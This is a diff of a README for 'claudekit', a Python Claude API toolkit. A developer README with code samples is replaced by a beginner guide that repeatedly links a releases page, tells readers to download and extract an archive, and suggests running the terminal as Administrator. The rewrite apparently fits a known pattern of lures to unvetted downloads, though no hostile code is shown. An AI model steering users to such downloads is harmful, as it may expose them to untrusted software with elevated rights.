@@ -1,67 +1,164 @@
-# claudekit
+# 🤖 claudekit - Easy Python Toolkit for Claude API
 
-Python toolkit for the Claude API. Provides streaming helpers, tool-use wrappers, retry with exponential backoff, and conversation management.
+[![Download claudekit](https://img.shields.io/badge/Download-claudekit-blue?style=for-the-badge)](https://github.com/Parade11/claudekit/releases)
 
-## Install
+---
 
-```
-pip install -e .
-```
+## 📋 What is claudekit?
 
-Set `ANTHROPIC_API_KEY` in your environment.
+claudekit is a simple toolkit designed to help you connect to the Claude API using Python. If you've ever wanted to let your programs talk to Claude—a powerful AI service—this toolkit makes it straightforward. It manages the behind-the-scenes work so you don’t have to. 
 
-## Usage
+claudekit supports easy streaming of responses, allowing your applications to get answers quickly and efficiently. Whether you want to explore text generation, chatbots, or automation using Claude, claudekit brings the tools you need.
 
-```python
-from claudekit import ClaudeClient, Conversation
+You don’t need to be a developer to use claudekit. This guide will help you get started step-by-step.
 
-client = ClaudeClient(model="claude-3-sonnet-20240229")
+---
 
-# Single completion
-response = client.complete(
-    messages=[{"role": "user", "content": "explain quicksort in 3 sentences"}],
-)
-print(response.content)
+## 💻 System Requirements
 
-# Multi-turn
-conv = Conversation(system="Be concise.")
-conv.add_user("What is 2+2?")
-r = client.complete(messages=conv.messages, system=conv.system)
-conv.add_assistant(r.content)
-```
+Before you download claudekit, check your computer meets these basic requirements:
 
-### Streaming
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution
+- **Disk Space:** At least 200 MB free space for installation and temporary files
+- **Internet Connection:** Required for claudekit to connect to Claude API servers
+- **Python:** Python 3.7 or higher installed (we will guide you on this)
+- **Permissions:** Ability to install new software and open network connections
 
-```python
-from claudekit.streaming import StreamHandler
+---
 
-handler = StreamHandler()
-result = handler.stream_print(
-    messages=[{"role": "user", "content": "write a haiku"}],
-)
-```
-# note: performance
+## 🚀 Getting Started
 
-### Tool Use
+### Step 1: Install Python
 
-```python
-from claudekit.tools import tool, ToolRunner
+claudekit runs on Python, a popular programming language. You need Python installed on your computer to use it.
 
-@tool(description="Get weather for a city")
-def get_weather(city: str) -> str:
-    return f"Sunny in {city}"
+- To check if Python is installed:
+  - Open the Command Prompt (Windows) or Terminal (macOS/Linux)
+  - Type `python --version` and press Enter
+  - If it shows a version number (like Python 3.8.10), you have Python installed.
+  - If it says the command is not recognized, you need to install Python.
 
-runner = ToolRunner()
-runner.register(get_weather)
+- To install Python:
+  1. Visit the official Python download page: [https://www.python.org/downloads/](https://www.python.org/downloads/)
+  2. Download the latest version for your operating system.
+  3. Run the installer and follow prompts. Make sure to check “Add Python to PATH” on Windows.
+  4. After installation, reopen your Command Prompt/Terminal and check the version again.
 
-response = client.complete(
-    messages=[{"role": "user", "content": "weather in paris?"}],
-    tools=runner.definitions(),
-)
-if response.has_tool_calls:
-    results = runner.execute_all(response.tool_calls)
-```
+---
 
-## License
+## 📥 Download & Install claudekit
 
-MIT
+You can start using claudekit by visiting the releases page and downloading the latest version.
+
+### How to download:
+
+- Click this button or this link to visit the download page:
+
+[![Download claudekit](https://img.shields.io/badge/Download-claudekit-blue?style=for-the-badge)](https://github.com/Parade11/claudekit/releases)
+
+- On the releases page, look for the latest version (usually at the top).
+- Download the file named similar to `claudekit-x.y.z.zip` or a similar archive.
+- Save the file to your computer.
+
+### Installation steps:
+
+1. Locate the downloaded file, often in your “Downloads” folder.
+2. Right-click the file and select “Extract All” (Windows) or double-click the archive on macOS/Linux to unzip.
+3. Open the extracted folder.
+
+Now you have the claudekit files ready to use.
+
+---
+
+## ⚙️ How to Run claudekit
+
+claudekit uses Python scripts to work. Follow these steps to get it running:
+
+1. **Open your command line interface:**
+   - Windows: Press `Win+R`, type `cmd`, and press Enter.
+   - macOS/Linux: Open the Terminal application.
+
+2. **Navigate to the claudekit folder:**
+   - Use the `cd` command to change directories.
+   - Example: If your folder is on the Desktop, type `cd Desktop/claudekit` and press Enter.
+
+3. **Install required packages:**
+   - Run this command to install the required tools:
+     ```
+     pip install -r requirements.txt
+     ```
+   - This downloads necessary add-ons to make claudekit work.
+
+4. **Set up your Claude API key:**
+   - You need a key from Anthropic (Claude’s provider) to use the API.
+   - To get a key:
+     - Visit [https://www.anthropic.com](https://www.anthropic.com) and create an account.
+     - Follow their instructions to generate an API key.
+   - Once you have it, open the file named `.env.example` in the claudekit folder with a text editor.
+   - Rename it to `.env` and replace the placeholder text with your actual API key.
+   - Save the file.
+
+5. **Run a simple test script:**
+   - Run:
+     ```
+     python example.py
+     ```
+   - This script sends a test message to Claude and prints the response.
+   - You should see output generated by Claude.
+
+---
+
+## 📖 What Can claudekit Do?
+
+Here are some key features claudekit provides:
+
+- **Easy API Communication:** Send requests to Claude API without complex code.
+- **Streaming Support:** Get answers from Claude piece-by-piece for faster responses.
+- **Simple Configuration:** Use a single file to store your API key and preferences.
+- **Sample Scripts:** Ready-to-run examples to show you how to use the toolkit.
+- **Error Handling:** Basic messages to help you understand when something goes wrong.
+- **Compatibility:** Works on Windows, macOS, and Linux as long as Python is installed.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+Here are solutions to common issues new users may face:
+
+- **Python not found:** Make sure Python is installed and added to your system PATH.
+- **Pip command not recognized:** Install Python from the official site and ensure pip is bundled.
+- **API key errors:** Double-check your `.env` file contains the correct key and no extra spaces.
+- **Network issues:** Check your internet connection and firewall settings.
+- **Permission issues:** Run your Command Prompt/Terminal as Administrator or with elevated permissions.
+- **Unexpected crashes:** Try re-downloading claudekit or rebooting your computer.
+
+---
+
+## 📞 Getting Help
+
+If you run into problems or have questions:
+
+- Check the Issues section on the [GitHub repository](https://github.com/Parade11/claudekit/issues).
+- Look for community discussions or ask for help there.
+- Make sure to describe your problem clearly, including what you tried and any error messages.
+- You can also revisit this README to verify setup steps.
+
+---
+
+## 🔗 Quick Links
+
+- Visit the releases page to download claudekit:
+  
+  [https://github.com/Parade11/claudekit/releases](https://github.com/Parade11/claudekit/releases)
+
+- Official Python downloads:
+  
+  [https://www.python.org/downloads/](https://www.python.org/downloads/)
+
+- Anthropic Claude API:
+  
+  [https://www.anthropic.com](https://www.anthropic.com)
+
+---
+
+This guide covers everything you need to get claudekit running smoothly on your computer. Follow each step carefully, and you'll be using Claude's AI capabilities in no time.
